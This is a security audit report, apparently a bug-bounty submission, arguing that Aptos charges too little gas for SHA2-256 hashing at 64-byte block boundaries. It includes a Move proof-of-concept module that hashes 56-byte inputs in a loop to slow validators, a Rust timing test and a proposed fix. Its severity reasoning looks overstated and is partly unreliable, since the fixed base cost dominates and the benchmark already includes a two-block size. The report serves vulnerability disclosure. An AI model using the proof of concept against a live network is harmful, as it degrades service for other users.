# Audit Report

## Title
SHA2-256 Gas Undercharging at Block Boundaries Enables Computational DoS

## Summary
The `native_sha2_256()` function charges gas using a linear formula based on input length, but SHA-256's block-based computation creates step functions at specific input sizes. Attackers can exploit inputs at critical boundaries (e.g., 56, 120, 184 bytes) to maximize computation time relative to gas cost, causing validator slowdowns.

## Finding Description
The SHA2-256 native function uses a linear gas charging model that does not accurately reflect the underlying block-based computation of the SHA-256 algorithm. [1](#0-0) 

The gas cost formula is: `HASH_SHA2_256_BASE + HASH_SHA2_256_PER_BYTE * input_length` [2](#0-1) 

With parameters: base = 11,028 internal gas units, per_byte = 183 internal gas units.

However, SHA-256 processes data in 512-bit (64-byte) blocks with specific padding rules that create performance discontinuities:
- Inputs of 0-55 bytes require 1 block to process
- Inputs of 56-63 bytes require 2 blocks to process (nearly 2x computation for just 1 additional byte!)
- Inputs of 64-119 bytes require 2 blocks
- Inputs of 120-183 bytes require 3 blocks

The gas calibration process used benchmark data at sizes: 0, 1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024 bytes. [3](#0-2) 

This benchmark suite **misses the critical 55-56 byte boundary** where the most significant performance jump occurs. The linear model fitted to these data points averages across all tested sizes, but at untested boundary points, actual computation can deviate significantly from the linear prediction. [4](#0-3) 

**Attack Path:**
1. Attacker creates Move module calling `std::hash::sha2_256()` with inputs sized at critical boundaries (56, 120, 184, 248 bytes)
2. For 56 bytes: Gas cost = 11,028 + 183×56 = 21,276 units, but requires 2 full block compressions
3. For 55 bytes: Gas cost = 11,028 + 183×55 = 21,093 units, but requires only 1 block compression  
4. Gas difference: 183 units (0.87% more), but computation difference: 100% more (2 blocks vs 1 block)
5. Attacker floods mempool with such transactions up to the gas limit
6. Validators spend disproportionate CPU time processing these transactions
7. Block production and throughput degrade

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits" - the gas limit does not accurately bound computational work for SHA-256 operations.

## Impact Explanation
This qualifies as **High Severity** per Aptos bug bounty criteria: "Validator node slowdowns."

The impact magnitude depends on:
1. The exact performance characteristics of the `sha2` crate implementation on validator hardware
2. The proportion of block execution time spent on SHA-256 operations
3. The attacker's ability to submit multiple such transactions

In worst case scenarios where validators process transactions dominated by boundary-optimized SHA-256 calls, processing time could be 1.5-2x longer than expected for the same gas cost. While individual transactions remain gas-bound, the aggregate effect of many such transactions can meaningfully degrade validator performance and network throughput.

## Likelihood Explanation
**Likelihood: High**

1. **Accessibility:** Any user can call `std::hash::sha2_256()` from Move code without special privileges
2. **Cost:** Attacker only pays normal gas fees (though undercharged for actual computation)
3. **Detection:** Difficult to distinguish from legitimate usage - transactions appear valid
4. **Complexity:** Low - attacker simply needs to craft inputs at known boundary sizes
5. **Scalability:** Can spam mempool with multiple transactions to amplify effect

The attack is straightforward to execute and requires no insider access or complex exploit chains.

## Recommendation

**Short-term fix:** Recalibrate gas parameters using benchmark data that includes critical boundary sizes (55-56, 119-120, 183-184 bytes). Fit a piecewise linear or block-based model instead of simple linear regression.

**Long-term fix:** Implement block-aware gas metering for SHA-256 that charges based on the number of 512-bit blocks processed:

```rust
fn native_sha2_256(
    context: &mut SafeNativeContext,
    _ty_args: &[Type],
    mut arguments: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    let hash_arg = safely_pop_arg!(arguments, Vec<u8>);
    
    // Calculate number of 512-bit blocks that will be processed
    // SHA-256 padding: message + 1 bit + zeros + 64-bit length
    let message_bits = hash_arg.len() as u64 * 8;
    let padded_bits = message_bits + 1 + 64;
    let num_blocks = (padded_bits + 511) / 512; // Round up to block boundary
    
    let cost = HASH_SHA2_256_BASE + HASH_SHA2_256_PER_BLOCK * num_blocks;
    context.charge(cost)?;
    
    let hash_vec = Sha256::digest(hash_arg.as_slice()).to_vec();
    Ok(smallvec![Value::vector_u8(hash_vec)])
}
```

Update gas schedule to include `HASH_SHA2_256_PER_BLOCK` parameter calibrated to actual per-block computation cost.

## Proof of Concept

```move
module attacker::dos_sha256 {
    use std::hash;
    use std::vector;
    
    // Craft inputs at critical block boundary (56 bytes)
    // This gets 2 blocks of computation for minimal gas increase over 55 bytes
    public entry fun exploit_boundary(iterations: u64) {
        let data = vector::empty<u8>();
        let i = 0;
        
        // Create exactly 56 bytes (forces 2-block processing)
        while (i < 56) {
            vector::push_back(&mut data, (i as u8));
            i = i + 1;
        };
        
        // Call sha2_256 repeatedly to maximize DoS effect
        let j = 0;
        while (j < iterations) {
            let _hash = hash::sha2_256(data);
            j = j + 1;
        };
    }
    
    // For comparison: 55 bytes gets only 1 block processing
    public entry fun normal_usage(iterations: u64) {
        let data = vector::empty<u8>();
        let i = 0;
        
        while (i < 55) {
            vector::push_back(&mut data, (i as u8));
            i = i + 1;
        };
        
        let j = 0;
        while (j < iterations) {
            let _hash = hash::sha2_256(data);
            j = j + 1;
        };
    }
}
```

**Benchmark test (Rust):**
```rust
// Add to crates/aptos-crypto/benches/hash.rs
#[test]
fn demonstrate_boundary_undercharging() {
    use sha2::{Digest, Sha256};
    use std::time::Instant;
    
    // Benchmark 55 bytes (1 block)
    let data_55 = vec![0u8; 55];
    let start = Instant::now();
    for _ in 0..10000 {
        let _ = Sha256::digest(&data_55);
    }
    let time_55 = start.elapsed();
    
    // Benchmark 56 bytes (2 blocks)
    let data_56 = vec![0u8; 56];
    let start = Instant::now();
    for _ in 0..10000 {
        let _ = Sha256::digest(&data_56);
    }
    let time_56 = start.elapsed();
    
    println!("55 bytes: {:?}", time_55);
    println!("56 bytes: {:?}", time_56);
    println!("Ratio: {:.2}x", time_56.as_nanos() as f64 / time_55.as_nanos() as f64);
    
    // Calculate gas efficiency
    let gas_55 = 11028 + 183 * 55;
    let gas_56 = 11028 + 183 * 56;
    println!("Gas ratio: {:.2}x", gas_56 as f64 / gas_55 as f64);
}
```

## Notes

The severity of this vulnerability depends on the actual performance characteristics of the `sha2` crate on validator hardware. Modern implementations may use SIMD optimizations that partially mitigate block boundary effects, but the fundamental algorithmic property remains: SHA-256 processes data in discrete blocks, creating step functions that a linear gas model cannot perfectly capture.

The vulnerability is particularly concerning because:
1. The benchmark data demonstrably omits critical boundary points
2. The linear calibration methodology averages across tested points, missing localized deviations
3. Attackers can systematically target undercharged input sizes to maximize DoS impact
4. The fix is straightforward: use block-aware gas metering instead of byte-based metering

### Citations

**File:** aptos-move/framework/move-stdlib/src/natives/hash.rs (L37-42)
```rust
    context.charge(
        HASH_SHA2_256_BASE + HASH_SHA2_256_PER_BYTE * NumBytes::new(hash_arg.len() as u64),
    )?;

    let hash_vec = Sha256::digest(hash_arg.as_slice()).to_vec();
    Ok(smallvec![Value::vector_u8(hash_vec)])
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/move_stdlib.rs (L23-24)
```rust
        [hash_sha2_256_base: InternalGas, "hash.sha2_256.base", 11028],
        [hash_sha2_256_per_byte: InternalGasPerByte, "hash.sha2_256.per_byte", 183],
```

**File:** crates/aptos-crypto/benches/hash.rs (L32-38)
```rust
    let mut sizes = vec![0, 1];

    let mut size = *sizes.last().unwrap();
    for _ in 1..=10 {
        size *= 2;
        sizes.push(size);
    }
```

**File:** scripts/algebra-gas/README.md (L19-32)
```markdown
Compute `gas_per_ns` using `hash/SHA2-256` bench results.
```
scripts/algebra-gas/load_bench_datapoints.py --bench_path target/criterion/hash/SHA2-256
scripts/algebra-gas/fit_linear_model.py --dataset_path hash_SHA2_256.0-1025.json --plot
```
This will fit a curve `f(n)=kn+b`
that predicts the time (in nanoseconds) to evaluate SHA2-256 on an input of size `n`.
Value `k` and `b` should be printed.
```
{"b": 336.51096106242346, "k": 4.868293006038344}
```

Combined with the [pre-defined](https://github.com/aptos-labs/aptos-core/blob/2d6ed231ca39fc07422dfe95aa76746b2210e36d/aptos-move/aptos-gas-schedule/src/gas_schedule/move_stdlib.rs#L23-L24) SHA2-256 gas formula (unscaled internal gas):`g(n)=183n+11028`,
it can be calculated that `gas_per_ns = 183/k`.
```
